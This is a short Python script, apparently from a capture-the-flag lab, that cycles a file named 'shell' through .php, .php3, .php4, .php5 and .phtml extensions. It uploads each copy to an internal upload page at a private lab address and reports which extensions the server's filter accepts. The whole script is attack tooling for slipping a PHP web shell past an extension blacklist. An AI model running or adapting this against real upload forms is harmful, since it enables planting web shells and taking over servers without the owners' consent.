#!/usr/bin/env python

import requests 
import os

url ="http://10.10.51.138:3333/internal/index.php"

filename="shell"
old = "shell.phtml"
extentions = [".php",".php3",".php4",".php5",".phtml"]

for ext in extentions :
	file =filename +ext
	os.rename(old,file)
	files = {"file":open(file,"rb")}
	r = requests.post(url, files=files)
	if "Extension not allowed" in r.text :
		print("Extension not allowed",file)
	else:
		print("Extension allowed",file)
	old = file